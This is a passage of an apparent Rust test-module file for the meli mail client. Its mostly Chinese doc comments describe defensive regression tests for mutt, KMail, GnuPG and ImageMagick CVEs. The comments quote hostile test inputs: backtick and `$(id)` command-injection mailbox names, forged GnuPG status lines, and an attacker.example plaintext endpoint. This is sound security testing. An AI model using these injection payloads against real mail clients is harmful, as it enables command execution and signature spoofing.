///    `;`/引号的 MVG/MSL 名）× 裸/双引号/反引号/`$()`/单引号/here-document
///    六种 shell 上下文，marker 永不出现、命令以 0 正常退出、`%s` 恰好展开为
///    单一实参、`id`/`pwned` 永不成为独立命令。
/// 5. `nametemplate_percent_s_mvg_stays_single_argument`、
///    `id_and_touch_payload_names_never_run_as_commands`、
///    `shell_metacharacter_image_content_never_executes`：nametemplate、
///    经典 `id`/`touch` 名与全部 PoC 正文的补充锁定。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 没有 ImageMagick
/// 或任何图片解码功能面，附件字节全程不透明，文件名/内容里的 shell 元字符在
/// 六种上下文里都只是惰性字节。CVE 的「解码不可信图片 → 拼 shell 命令」原语
/// 在 meli 中不可表达。
///
/// [`cve_2016_3714`]: self::cve_2016_3714
/// [`File::create_temp_file`]: meli::types::File::create_temp_file
/// [`MailcapEntry::run`]: meli::mailcap::MailcapEntry::run
#[cfg(test)]
#[path = "CVE-2016-3714.rs"]
mod cve_2016_3714;

/// CVE-2020-15954（KMail 19.12.3，CVSS 6.5，NVD / CIRCL）**POP3 账户启用 TLS
/// 时 UI 按配置显示「已加密」、实际会话仍明文** regression（Gitea issue #122，
/// 表 5 协议信任边界 of `SECURITY-CVE-RESEARCH.zh-CN.md`）：MITM 可借此窃取
/// 邮件正文与 `USER`/`PASS` 凭据。meli 无 POP3 后端，issue 指定以
/// IMAP / SMTP / NNTP 等价面证明「安全状态只能来自真实 TLS 握手，绝不来自配置
/// 开关」。
///
/// **meli 等价面映射（免疫证明）**：`Connection::Tls` 只能由
/// `Connection::new_tls(native_tls::TlsStream<Connection>)` 构造，而全仓库
/// `new_tls(` 调用恰 3 处（IMAP / NNTP / SMTP），每处都严格位于
/// `connector.connect()` 成功之后、失败即 `?` 传播丢弃半开连接 → fail-closed；
/// 三个协议的 `use_tls`/`SmtpSecurity` 都先进入真实握手，隐式 TLS 直连握手、
/// STARTTLS 只认 tagged OK，`LOGIN`/`AUTH`/`AUTHINFO` 一律在 TLS 流建立之后；
/// `meli/src`（UI）除 tests 外零处读取配置 TLS 标识符、状态栏无 `TLS` 字样，
/// 不存在「按配置宣称已加密」的 UI 路径。
///
/// [`cve_2020_15954`] 分层锁定（详见模块内注释）：Layer 1 纯模型复刻 KMail
/// 缺陷（指示器读配置、明文线泄凭据）；Layer 2 类型级断言裸 TCP / `Fd` /
/// `Deflate` 都不是 `Tls`；Layer 3 九个真实 loopback 敌意服务器场景（IMAP /
/// SMTP / NNTP × 隐式 TLS / STARTTLS 拒绝 / STARTTLS 伪造成功）断言客户端进入
/// ClientHello、握手失败 Err、无登录/认证明文片段，并以唯一哨兵凭据断言其明文
/// 与 base64 形态都不上线；Layer 4 源码扫描锁定构造点、卫语句与 UI 面。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 的安全状态永远是
/// 「实时 TLS 握手是否成功」的函数。
///
/// [`cve_2020_15954`]: self::cve_2020_15954
#[cfg(test)]
#[path = "CVE-2020-15954.rs"]
mod cve_2020_15954;

/// CVE-2021-38373（KMail 19.12.3 / 5.13.3，CVSS 5.3，NVD / CIRCL）**STARTTLS 安全
/// 升级被认证设置门控、未勾「服务器需要认证」时明文发送** regression（Gitea issue
/// #123，表 5 协议信任边界 of `SECURITY-CVE-RESEARCH.zh-CN.md`）：账户勾选 STARTTLS
/// 却未勾认证时旧客户端不执行 STARTTLS，MITM 降级即可窃取凭据与邮件正文。
/// meli 的 SMTP `new_connection` 把 STARTTLS 当作与认证**正交**的前置步骤：
/// TCP→220 greeting→EHLO→250→STARTTLS→强制 220→`connector.connect`
/// →`Connection::new_tls`，任一步失败 `?` 中止、绝不回退明文；`AUTH` 逻辑严格位于
/// TLS 流建立之后；`SmtpSecurity::Auto` 按端口确定性收敛（465→Tls、587→StartTLS、
/// 其余报错）；启动期 `SmtpServerConf::validate` 拒绝
/// `danger_accept_invalid_certs=true`。
///
/// [`cve_2021_38373`] 分层锁定（详见模块内注释）：Layer 1 纯模型复刻 KMail 门控缺陷
/// （勾 STARTTLS 未勾认证 → 明文 AUTH/邮件上线），对照加固模型同服务器会话中止；
/// Layer 2 `SmtpServerConf::validate` 三 TLS 变体危险标志全 Err；Layer 3 七个真实
/// loopback 敌意服务器场景（EHLO 不广告能力、`require_auth=false`、`SmtpAuth::None`、
/// 伪造 220、错误成功码 250、`Auto@587`、`Auto@非常规端口`）断言 `new_connection`
/// 全部 Err 且捕获字节无 AUTH/MAIL FROM、无哨兵明文与 base64；Layer 4 源码扫描锁定
/// STARTTLS→220 顺序、认证判定晚于 `Connection::new_tls`、meli 启动期 validate 调用。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 的安全升级与认证设置正交，
/// 不存在「未勾认证即跳过 STARTTLS」的分支。
///
/// [`cve_2021_38373`]: self::cve_2021_38373
#[cfg(test)]
#[path = "CVE-2021-38373.rs"]
mod cve_2021_38373;

/// CVE-2024-50624 (KMail < 6.2.0 kmail-account-wizard, CVSS 5.9, NVD /
/// CIRCL) cleartext-autoconfig MITM regression (issue #124, table 5 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — protocol/trust boundaries):
/// `ispdbservice.cpp` fetched the mail-server configuration (Mozilla
/// autoconfig XML) over plaintext HTTP, so a man-in-the-middle could
/// answer with an attacker-controlled IMAP/SMTP endpoint set.
///
/// meli has no autoconfig / ISPDB / autodiscover feature surface; its one
/// 「network-delivered endpoint」 surface is JMAP session discovery — the
/// `/.well-known/jmap` GET whose Session object supplies `apiUrl`,
/// `uploadUrl`, `downloadUrl` and `eventSourceUrl` for all later
/// authenticated traffic, with Basic/Bearer credentials mounted on the
/// client itself. The corpus maps the attack there, and the recon exposed
/// two real gaps, both fixed with this regression: `JmapServerConf::new`
/// and `JmapType::validate_config` accepted a remote `http://`
/// `server_url` (the discovery GET itself then carried credentials in the
/// clear), and `JmapConnection::connect` consumed the four session URLs
/// with no scheme check at all. Both now enforce `https` — plaintext
/// `http` is tolerated only for loopback hosts (`localhost`, 127.0.0.0/8,
/// `::1`), where traffic never leaves the machine, so the `melib-test`
/// loopback mocks and local development keep working — and fail closed at
/// startup-validation and session-parse time.
///
/// [`cve_2024_50624`] locks it in four layers (details in the module
/// docs): Layer 1 reproduces the KMail `ispdbservice` over-adoption on the
/// autoconfig XML corpus (vulnerable model adopts `attacker.example`
/// plaintext endpoints; hardened model aborts); Layer 2 proves the
/// configuration surface (no autoconfig vocabulary in `meli/src`/
/// `melib/src`, ispdb XML cannot enter the TOML channel, the startup gate
/// rejects remote `http`/unknown schemes while `https` and loopback pass,
/// and the CVE-2009-3765 danger-flag rejection still holds); Layer 3 drives
/// a real loopback JMAP handshake (forged remote-http session fails closed
/// with zero follow-up bytes; loopback benign session still connects) plus
/// the `validate_session_urls` matrix; Layer 4 locks the source ordering.
///
/// Conclusion: **a real gap was found and fixed, not a pure immunity
/// proof** — meli lacks KMail's autoconfig feature (accounts come only
/// from a local TOML file), but its JMAP transport URLs previously
/// accepted remote plaintext HTTP.
///
/// [`cve_2024_50624`]: self::cve_2024_50624
#[cfg(test)]
#[path = "CVE-2024-50624.rs"]
mod cve_2024_50624;

/// CVE-2018-12020（GnuPG < 2.2.8，SigSpoof 1；CVSS v3.0 7.5）**`--status-fd`
/// 状态行伪造** regression（issue #125，表 5 协议与加密信任边界）：
/// GnuPG 的 `mainproc.c` 把 OpenPGP literal data 包的**原始文件名**未经
/// 清洗地写进 `--status-fd` 状态流，攻击者在文件名里注入
/// `\n[GNUPG:] GOODSIG …\n[GNUPG:] VALIDSIG …` 即可让一切「以状态文本
/// 判定验签结论」的客户端把一封只加密、未签名的邮件展示为「有效签名」
/// （GnuPG 2.2.8 起 percent-escape 该文件名）。
///
/// 语料全部为真 gpg 2.4.9 产物：SigSpoof 原样载荷（对 victim 一次性
/// cv25519 密钥只加密、literal 包文件名携带伪造 GOODSIG/VALIDSIG 行，
/// `--list-packets` 可见原始 `\x0a` 字节）、真签名组合消息（signer
/// 一次性 ed25519 密钥）与文件名投毒共存的最强位形、真 detached 签名
/// 与篡改对照、`\n`/`\r`/CRLF/NUL/VT/FF/NEL/LS/PS 全部文件名分隔符变体、
/// 现代 gpg 实测捕获的 percent-escape `PLAINTEXT` 状态行与 pre-2.2.8
/// 脆弱形态逐行重建。
///
/// [`cve_2018_12020`] 分层锁定（详见模块文档）：L0——meli/melib 的
/// Rust 源码不运行 gpg、不解析任何 `[GNUPG:]` 文本（逐源码扫描），裁决
/// 只来自 gpgme 结构化字段或脚本 JSON；L1——验签入口
/// [`extract_unverified_signature`] 的两条路（detached/cleartext）都不
/// 处理 literal 包，PGP MESSAGE armor 唯一路由是 decrypt 而其元数据
/// **结构上没有签名字段**，全部文件名变体以不透明字节旅行，伪造状态
/// 文本翻不动 [`signatures_into_error`] 的结构化裁决；L2——本 issue
/// 检出并修复 CLI 后端两个「以状态文本为裁决、无视 gpg 退出码」的真实
/// 缺口（`gpg_verify.py`：退出码无视 + 非 GOODSIG 摘要被确认 OK +
/// 失败流崩溃；`gpg_decrypt.py`：DECRYPTION_OKAY 文本即放行明文），
/// 修复后 shim 复放的脆弱状态流（pre-2.2.8 原始文件名形态）在两个脚本
/// 的输出里都没有任何签名落点/明文泄漏；L3——真 gpg + 真 gpgme：真验
/// → good、篡改 → BAD、组合消息冒充签名文件 → fail-closed，SigSpoof
/// 邮件解密时 `file_name` 以惰性数据形态抵达。
///
/// [`cve_2018_12020`]: self::cve_2018_12020
/// [`extract_unverified_signature`]: meli::melib::email::pgp::extract_unverified_signature
/// [`signatures_into_error`]: meli::mail::pgp::signatures_into_error
#[cfg(test)]
#[path = "CVE-2018-12020.rs"]
mod cve_2018_12020;

/// CVE-2018-14349（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8，
/// CWE-120）**恶意 IMAP 服务器无消息文本 NO 响应堆溢出** regression（issue
/// #143，表 2 病毒/代码执行；mutt/neomutt 2018-07 一次性披露 15 漏洞之
/// 一）：`imap/command.c` 在 NO 响应缺少消息文本时把错误长度带入响应文本
/// 缓冲，恶意服务器一条畸形 NO 即可在客户端堆上越界 → 崩溃乃至 RCE。
///
/// 语料内嵌 issue 逐字四条（`* NO <64KiB+ 文本>`、`* NO`、
/// `A1 NO [ALERT] <超长>`、`* NO [<超长 code>]`）加定长缓冲边界 ±1、
/// Dovecot `secs).` 计时后缀、非法 UTF-8/NUL、`{3}\r\n` 声明形状、
/// 4 MiB 级超长与经典响应码边界。
///
/// [`cve_2018_14349`] 分层锁定（详见模块文档）：解析层逐条 `catch_unwind`
/// 断言 `No(..)`/干净 `Err` 与逐字节存活；分帧层断言畸形 NO 不破坏
/// `split_rn` 的逐行一致性；连接循环层断言 `untagged_responses` 对 `* NO`
/// 全部 `Err`、`RequiredResponses::check` 的 NO 分支可预测，并在本地
/// hostile IMAP server 上驱动真实 `ImapConnection::read_response` 验证
/// untagged NO 原样保留、tagged NO 错误文本逐字、期望 NO 成功、缺文本 NO
/// 结构良好；响应上限层锚定 `MAX_SERVER_RESPONSE_SIZE`/`IO_BUF_SIZE` 并用
/// 永不结束的 NO 洪流验证 64 MiB 处 `ProtocolViolation`。与
/// CVE-2001-0473（同一 mutt IMAP 响应面的格式串面）划界：本文件只锁内存
/// 安全与分帧一致。结论：**免疫证明，未发现缺口，无需修改生产代码**。
///
/// [`cve_2018_14349`]: self::cve_2018_14349
#[cfg(test)]
#[path = "CVE-2018-14349.rs"]
mod cve_2018_14349;

/// CVE-2018-14350（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8，
/// CWE-121）**恶意 IMAP 服务器 FETCH 响应 INTERNALDATE 栈溢出** regression
/// （issue #144，表 2 病毒/代码执行；mutt/neomutt 2018-07 一次性披露 15 漏
/// 洞之一）：`imap/message.c::msg_parse_fetch` 用定长栈缓冲加 `sscanf` 类
/// 拷贝解析 FETCH 响应里的 INTERNALDATE 日期串，无长度边界；恶意服务器在
/// `* 1 FETCH (INTERNALDATE "<64KiB+ 无结束引号>` 塞超长/未终止日期即可写
/// 穿栈 → 崩溃乃至 RCE。
///
/// 语料内嵌 issue 逐字三条（`* 1 FETCH (INTERNALDATE "<64KiB+ 无结束引
/// 号>`、`INTERNALDATE ""`、非法时区/月份畸形日期）加定长缓冲边界 ±1、NIL、
/// `{3}\r\n` 字面量形状、截断 EOF、与 UID 共存、4 MiB 档与等价面（ENVELOPE
/// date nstring + `quoted` 原语）64KiB 标尺语料。
///
/// [`cve_2018_14350`] 分层锁定（详见模块文档）：解析层——meli 的
/// `fetch_response` 字段分派集闭合、**无 INTERNALDATE 分支**，未知 token
/// fail-closed `Err`（「Got unexpected token」），`raw_fetch_value` 单点
/// 有界切片；原语层——`quoted` 线性有界扫描（未终止 `Err`）、64KiB 终止
/// 日期堆 `Vec` 逐字节存活、`quoted_or_nil`/`literal` 截断干净失败；等价
/// 日期面——ENVELOPE date 64KiB 逐字节存活、畸形月份/时区优雅回退、RFC
/// 5322 形状日期与 `rfc5322_date` 直调一致（IMAP 连字符格式优雅回退）；
/// 流级——
/// `fetch_responses` 整体 `Err`、分帧确定、`many0` 得 0 封套不伪造；连接
/// 循环层——`check`/`untagged_responses` 全 `Err`，敌意行只作原始数据保留，
/// 并在本地 hostile IMAP server 上驱动真实 `ImapConnection::read_response`
/// 验证逐字节保留 + 生产 `fetch_responses` 端到端干净 `Err`、永不发 tagged
/// 完成的 INTERNALDATE 洪流在 64 MiB 上限 `ProtocolViolation`；源码锚点层
/// 证明无 INTERNALDATE 分支/客户端不请求该字段/调用点 `Ok(Some(..))` 门控。
/// 与 CVE-2000-0567（邮件头 `Date` 面）、CVE-2018-14349（NO 响应面）、
/// CVE-2020-9818（raw_fetch_value 截断面）划界。结论：**免疫证明，未发现
/// 缺口，无需修改生产代码**。
///
/// [`cve_2018_14350`]: self::cve_2018_14350
#[cfg(test)]
#[path = "CVE-2018-14350.rs"]
mod cve_2018_14350;

/// CVE-2018-14351（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8，
/// NVD 记 CWE-20，实质 CWE-787 相对写/CWE-120 家族）**恶意 IMAP 服务器把
/// STATUS 响应的 mailbox 名编码成 literal `{N}` 并用攻击者声明的计数做相对
/// 写** regression（issue #145，表 2 病毒/代码执行；mutt/neomutt 2018-07
/// 一次性披露 15 漏洞之一）：`imap/command.c::cmd_parse_status` 直接
/// `mailbox = idata->buf; s = mailbox + litlen; *s = '\0';`，把声明的
/// `{litlen}` 当作相对偏移写终止符而不校验缓冲实际长度，恶意服务器声明一个
/// 超过实际缓冲的计数即可内存破坏 → 崩溃乃至 RCE。
///
/// 语料内嵌 issue 逐字声明计数（`* STATUS {999999999} (MESSAGES 1)`、
/// `{4294967295}`、usize 溢出 `{99999999999999999999999}`、
/// `{18446744073709551615}`）加 64KiB+/4 MiB 超长 mailbox atom（含/不含
/// ` (`、含/不含 CRLF）、literal 计数不符（`{5}` 后仅 2 字节、`{0}`、
/// literal 数据含 ` (`、`{3}\r\n` 声明跨行）、计数器溢出（>u64、1 MiB 连
/// `9`、前导 +/空格/十六进制）与畸形（缺 `)`、缺 CRLF、截断 EOF、嵌套括号、
/// `* STATUS ` 后为空）。
///
/// [`cve_2018_14351`] 分层锁定（详见模块文档）：解析层逐条 `catch_unwind`
/// 断言干净 `Err` 或 `mailbox=None` 降级与逐字节一致；定长缓冲边界 ±1 ×
/// mailbox 长度/literal 计数 × 有/无 CRLF 用十六进制标尺证明成功路径逐字节
/// 精确、错误摘要一致；原语层验证 `literal` 单点 `length_data` 限定切片
/// （短缺/溢出/缺 `}\r\n` 干净失败）、`mailbox_token` 的 INBOX 大小写不敏感；
/// 计数器层断言溢出整体 `Err`、合法 max-usize 原样落入结构体、
/// `ingest_mailbox_list_line` 只对已知 mailbox 应用计数器；流级断言多行
/// LIST-STATUS 经 `split_rn` 行完整、整回复喂 `status_response` 后 tagged 行
/// 仍可解析；源码锚点层证明 `take_until(" (")` + `.ok()`、无
/// `unwrap()`/`expect()`、`untagged_responses` 无 STATUS 分派臂、消费方
/// `Ok`/`contains_key` 门控与 64 MiB 上限；真连接层在本地 hostile IMAP
/// server 上驱动真实 `ImapConnection::read_response` 验证 `* STATUS {huge}`
/// 行逐字节保留 + 生产 `status_response` 干净降级、永不发 tagged 完成的
/// STATUS 洪流在 64 MiB 上限 `ProtocolViolation`。与 CVE-2018-14349（NO
/// 响应面）、CVE-2018-14350（INTERNALDATE 面）、CVE-2026-70329（通用 literal
/// 声明/分帧环绕面）划界。结论：**免疫证明，未发现缺口，无需修改生产代码**。
///
/// [`cve_2018_14351`]: self::cve_2018_14351
#[cfg(test)]
#[path = "CVE-2018-14351.rs"]
mod cve_2018_14351;

/// CVE-2018-14352（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8，
/// NVD 记为 off-by-one 栈溢出，实质 CWE-787 相对写/CWE-121 栈缓冲溢出）
/// **mutt `imap/util.c::imap_quote_string` 把 `"`/`\` 反斜杠转义进定长栈
/// 缓冲时未给每个转义对预留空间 → 差一栈溢出 → 内存破坏乃至 RCE**
/// regression（issue #146，表 2 病毒/代码执行；mutt/neomutt 2018-07 一次性
/// 披露 15 漏洞之一）。
///
/// meli 对应面是 `melib/src/imap/search.rs::push_search_value` 的 quoted
/// 分支与 `melib/src/search.rs::escape_double_quote`。内存安全免疫：Rust 堆
/// `String` 无定长缓冲，新转义函数以 `String::with_capacity(value.len() * 2)`
/// 按最坏情况一次性预留。真实缺口在 RFC 3501 §9 的 quoted-specials 必须用单
/// 反斜杠转义 `\"`/`\\`：修复前 `escape_double_quote` 把 `"` 翻倍成非法的
/// `""`，且完全不转义 `\`，值尾 `\` 会吞掉 meli 自己的闭合引号、破坏命令
/// 结构。
///
/// 语料内嵌 1 万字节 `"`/`\` 语料（交替/全引号/全反斜杠/伪随机位图、均以
/// `\` 结尾）+ CR/LF literal 变体 + 混合 CJK + 定长缓冲边界 ±1
/// （255/256/257 … 65535/65536/65537）+ 空串。
///
/// [`cve_2018_14352`] 分层锁定（详见模块文档）：转义计费层断言
/// `escaped.len() == value.len() + count('"') + count('\\')` 且 ≤ `2×`、
/// 确定性、`catch_unwind` 无 panic、有界时间；RFC 往返层用自实现 RFC 3501
/// quoted-string 解析器逐字节还原原值，并证明只有 `\"`/`\\` 是合法转义；
/// 线上字节层断言
/// `search_send_steps`/`search_send_steps_non_sync` 的 literal `{n}` 计数精确、
/// text 段无 CR/LF、值尾 `\` AND `FROM "x"` 的整条命令可完整重放（修复前
/// 此断言失败）；源码锚点层用 `include_str!` 断言 `push_search_value` 使用
/// `escape_imap_quoted`、新函数同时转义 `\` 与 `"` 且 `with_capacity` 预留
/// 2×，并断言 `meli/src/sqlite3.rs` 仍引用 `escape_double_quote`（SQL LIKE
/// 语义不受影响）。与 CVE-2025-49113（CR/LF→literal 面）及
/// CVE-2018-14349/14350/14351（服务器响应解析面）划界。结论：**内存安全免疫；
/// 发现并修复一处 RFC 3501 quoted-specials 语义缺口**。
///
/// [`cve_2018_14352`]: self::cve_2018_14352
#[cfg(test)]
#[path = "CVE-2018-14352.rs"]
mod cve_2018_14352;

/// CVE-2018-14353（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8，
/// NVD 记为 integer underflow，实质 CWE-191 无符号下溢 → CWE-787 越界写）
/// **mutt `imap/util.c::imap_quote_string` 用 `size_t dlen` 维护定长栈
/// 缓冲剩余空间，进入先 `dlen -= 2`、循环里每个 `"`/`\` 转义再递减；预算
/// 中途耗尽或 `dlen < 2` 时无符号余量回绕成 `SIZE_MAX`，`while (*s && dlen)`
/// 永真 → 无界越界写 → 内存破坏乃至 RCE** regression（issue #147，表 2
/// 病毒/代码执行；mutt/neomutt 2018-07 一次性披露 15 漏洞之一）。
///
/// meli 对应面是 `melib/src/imap/search.rs::escape_imap_quoted` /
/// `push_search_value` / `LiteralPolicy` / `to_imap_search_segments(_quoted)` /
/// `search_send_steps(_non_sync)` / `non_sync_literal_text` 与
/// `melib/src/imap/connection.rs` 的发送路径；`melib/src/search.rs::escape_double_quote`
/// 是近似映射（真实调用方为 `meli/src/sqlite3.rs` 的 SQLite `LIKE` 语义，
/// `"`→`""` 翻倍对 SQL 正确，与 IMAP `\"` 互不相干）。内存安全免疫：Rust
/// 堆 `String` 无定长缓冲、无「剩余空间」可变无符号量，`escape_imap_quoted`
/// 以 `with_capacity(value.len() * 2)` 一次性最坏预留，`{n}` 直接取
/// `value.len()` 字节长度。
///
/// 语料内嵌空值（零长度剩余空间）、单字节 `"`、仅以 `\` 结尾的值、≥1 万字节
/// 非 ASCII（CJK/emoji 混合）literal 路径、Quoted 回退路径与定长缓冲边界 ±1
/// （0/1/2、255/256/257 … 65535/65536/65537）。
///
/// [`cve_2018_14353`] 分层锁定（详见模块文档）：转义计费层断言
/// `escaped.len() == value.len() + count('"') + count('\\')` 且 ≤ `2×`、
/// 空值 `Cow::Borrowed("")`、确定性、`catch_unwind` 全语料无 panic、有界时间；
/// RFC 往返层用自实现 RFC 3501 §9 `QUOTED-CHAR` 解析器逐字节还原；线上字节层
/// 断言 literal `{n}`/`{n+}` 计数 == `octets.len()`、`non_sync_literal_text`
/// 只改写真正尾随计数（`{`/`{}`/`{a}`/quoted 内部 `{3}` 不改）、text 段无
/// CR/LF 且无 NUL、`search_send_steps` 步骤流可重放、Quoted 回退对 CR/LF
/// 返回 None fail-closed；源码锚点层用 `include_str!` 断言
/// `push_search_value` 无 `dlen`/`-=` 式余量算术、`escape_imap_quoted` 的
/// `with_capacity(value.len() * 2)` 仍在、`escape_double_quote` 仍只做 `""`
/// 翻倍。与 CVE-2018-14352（同一函数的 off-by-one 面）及 CVE-2025-49113
/// （CR/LF→literal 面）划界。结论：**内存安全免疫，未发现缺口，无需修改
/// 生产代码**。
///
/// [`cve_2018_14353`]: self::cve_2018_14353
#[cfg(test)]
#[path = "CVE-2018-14353.rs"]
mod cve_2018_14353;

/// CVE-2018-14354（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL）**恶意 IMAP 服务器在 LIST/LSUB 响应里返回含反引号（命令替换）、
/// 引号、CRLF、控制字符或超长邮箱名；mutt 的订阅/退订流程把服务器返回的名字
/// 拼进 `mailboxes` 配置命令，mutt 配置语言把反引号当命令替换执行 → 远端任意
/// 命令执行** regression（issue #148，表 2 病毒/代码执行；mutt/neomutt
/// 2018-07 一次性披露 15 漏洞之一）。NVD 原文：*"They allow remote IMAP
/// servers to execute arbitrary commands via backquote characters, related to
/// the mailboxes command associated with a manual subscription or
/// unsubscription."*
///
/// meli 对应面：解析层 `melib/src/imap/protocol_parser.rs::list_mailbox_result`
/// （`mailbox_token`→`astring_token`→`string_token`/`literal`，整段响应先经
/// `ImapLineIterator::split_rn` 分帧）；存储层
/// `melib/src/imap/mod.rs::ingest_mailbox_list_line`/`imap_mailboxes` 把名字存进
/// `ImapMailbox.imap_path` 并生成类型化 `MailboxHash`；重发层
/// `set_mailbox_subscription`/`create_mailbox`/`delete_mailbox` 经
/// `CommandBody::subscribe/unsubscribe`（imap-types 构造期逐字节校验，NUL
/// fail-closed）与 `CommandCodec`/`Fragment::Line|Literal` 重新序列化；mutt
/// 真正的漏洞点——`mailboxes` 式配置命令解释器——meli 不存在，邮箱名永不进入
/// 任何 shell 或配置求值。
///
/// 语料内嵌反引号命令替换（`` `touch${IFS}/tmp/pwned` ``、`$(id)`、纯反引号
/// atom、反引号+引号、反引号+CRLF、尾反斜杠）、≥1 万字节超长名（ASCII/
/// 反引号/CRLF/NUL/非 ASCII 变体）、定长缓冲边界 ±1
/// （0/1/2、255/256/257 … 65535/65536/65537）、非 ASCII literal 与
/// 层级分隔符堆叠名。
///
/// [`cve_2018_14354`] 分层锁定（详见模块文档）：a 解析层断言未闭合引号、
/// 引号内 CRLF（`split_rn` 分帧后逐行）、被反斜杠吞掉的闭合引号、缺失/`NIL`
/// 分隔符、`{n}` 声明超出缓冲全部干净 `Err`，NUL/CTL/空串被接受时仅作数据
/// 落地，逐条 `catch_unwind` 无 panic、有界时间；b 反引号核心层断言
/// `imap_path` 原样保留反引号、`MailboxHash::from_bytes` 只产生类型化哈希、
/// 每 `Fragment::Line` 恰好一个 CRLF 且内部无 CR/LF、反引号总数逐字节守恒、
/// CR/LF 名强制 Literal（`{n}` == 字节长）、NUL 名 `CommandBody` 构造期
/// `is_err()` fail-closed；c 全语料 parse→extract→subscribe/unsubscribe 往返
/// 逐字节一致、纯 ASCII 安全名单 fragment 且命令前缀正确、超深度
/// `MAX_MAILBOX_HIERARCHY_DEPTH` 断言 `Err`、时间有界；d 源码锚点层用
/// `std::fs` 扫描 `melib/src/imap/` 全目录 `.rs` 证明无
/// `Command::new`/`process::Command`/`.spawn(`，三处订阅/删除调用点仍用
/// `CommandBody::subscribe(`/`unsubscribe(` 且无大写原始 verb，`imap_mailboxes`
/// 的 LSUB 分支仍走 `protocol_parser::list_mailbox_result`，`send_command` 仍按
/// `Fragment::Line`/`Literal` 分段并在 `LiteralMode::Sync` 等 continuation。
/// 与 CVE-2018-14352/14353（同一 `imap_quote_string` 的定长缓冲内存破坏面）划界。
/// 结论：**命令执行/内存安全免疫，未发现缺口，无需修改生产代码**。
///
/// [`cve_2018_14354`]: self::cve_2018_14354
#[cfg(test)]
#[path = "CVE-2018-14354.rs"]
mod cve_2018_14354;

/// CVE-2018-14356（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL；NVD 原文 *"If an IMAP server returns a null UID in a COPY
/// response or in a UID FETCH response, mutt dereferences a null pointer."*
/// ——同一根因的两个变体：POP3 与 IMAP。家族描述见
/// `SECURITY-CVE-RESEARCH.zh-CN.md` 表 2 第 91 行：mutt/neomutt 2018-07
/// 一次性披露的 15 个漏洞之一，**「POP 空 UID 空指针」**）**恶意 POP/IMAP
/// 服务器在 `UID FETCH` 响应里把 `UID` 项的数值为空（`UID ` 之后没有数字），
/// mutt 把 `atoi()` 的零返回误作有效 UID 继续使用同一封邮件的下标；当后续
/// 路径假定该 UID 必然有非空副本（去重缓存键、SMIME / PGP 会话句柄）即
/// 解引用空指针** 攻击模拟回归（issue #150，表 2 病毒/代码执行）。
///
/// meli 对应面（issue #150 指定）：meli 无 POP3 后端
/// （`melib/src/backends.rs` 只注册 `maildir`/`mbox`/`imap`/`notmuch`/
/// `jmap`/`smtp`，`UID` 类型唯一定义在 `melib/src/imap/mod.rs`），故等价面
/// 映射为两条「POP 协议响应把服务器控制字节化为对端 UID 假设的字段」：
/// `melib/src/imap/protocol_parser.rs::fetch_response`/`uid_fetch_flags_response`
/// 对 `UID ` 之后无数字的 `* 1 FETCH (UID )CRLF` 等变体 fail-closed（mutt
/// `atoi("")` 返回 0 而 meli 用 `take_while + from_str` 阻断），以及
/// `melib/src/email/parser.rs` 的 `mail`/`header`/`headers`/`headers_raw`
/// 对空输入强契约 `Err`（`many1` + 显式 `input.is_empty()` 短路），构成
/// 「空指针解引用免疫」的双层防线。
///
/// 语料内嵌 issue 点名全部攻击形态：空响应 `CRLF`、「`* 1 FETCH (UID )CRLF`」、
/// 多空格/截断/空 literal/`()` 空状态响应等 POP 类空响应，以及 ≥1 KiB NUL/
/// 空格/混合 4 KiB 长语料防 panic 与有界时间。
///
/// [`cve_2018_14356`] 分四层锁定（详见模块文档）：a 源树 POP3 客户端缺位证
/// 明：扫描 `melib/src/` 全部 `.rs` 文件不含 `pop3`/`POP3`/`Pop3Type`/
/// `b"+OK "`/`b"-ERR "`/`port: 110`/`pop3_session`/`mutt/pop.c`/`pop_lib`
/// 任一 POP3 痕迹，`backends.rs` 不注册 POP3，`UID` 类型唯一定义在
/// `melib/src/imap/mod.rs::UID = ImapNum = usize`；b `UID FETCH` 空 UID 解
/// 析：issue 点名「`* 1 FETCH (UID )CRLF`」、多空格、截断、空 literal、混合
/// FLAGS+UID、`()`/`M1 `/NUL 等空响应经 `fetch_response`/`uid_fetch_flags_response`
/// 全部 `catch_unwind` 无 panic 且 `is_err()`，不 panic 是关键——C 端
/// `atoi("")` 静默返 0，meli 必须显式 `Err`；c `mail`/`header`/`headers`/
/// `headers_raw` 空输入契约：`mail(b"")`/`headers(b"")`/`header(b"")`/
/// `headers_raw(b"")` 全部 `Result::is_err()` 且不 panic，4 KiB NUL/SP 与
/// 纯 LF/纯 CRLF 对照证明契约在 RFC 5322 §3.6.8 字段规约之内无歧义；
/// d `UID = usize`/`Option<UID>` 类型锚点：`UID::from_str("")` 经
/// `std::num::FromStr` 必返回 `Err(ParseIntError)`（非 0 sentinel），`uid`
/// 字段为 `Option<UID>` 而非 `UID`，`UidStore` 用 `HashMap` 无零值
/// sentinel。与 CVE-2018-14349/14350/14351/14352/14353/14354（同一
/// mutt/neomutt 2018-07 一次性披露家族，分别锁 NO/INTERNALDATE/STATUS
/// literal/`imap_quote_string` 内存破坏/订阅命令执行面）正交，本语料以
/// 「POP 空 UID」为焦点，标记 `14356` 逐字隔离。
///
/// [`cve_2018_14356`]: self::cve_2018_14356
#[cfg(test)]
#[path = "CVE-2018-14356.rs"]
mod cve_2018_14356;

/// CVE-2018-14357（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL；NVD 原文 *"They allow remote IMAP servers to execute arbitrary
/// commands via backquote characters"*；Gentoo 标注 *"LSUB Remote Code
/// Execution"*）**恶意 IMAP 服务器在 `LSUB` 响应里返回含反引号的邮箱名；
/// mutt 把 LSUB 得到的名字送进 `mailboxes` 配置命令解释器，反引号被当作
/// 命令替换执行 → 远端任意命令执行** 攻击模拟回归（issue #151，表 2 病毒/
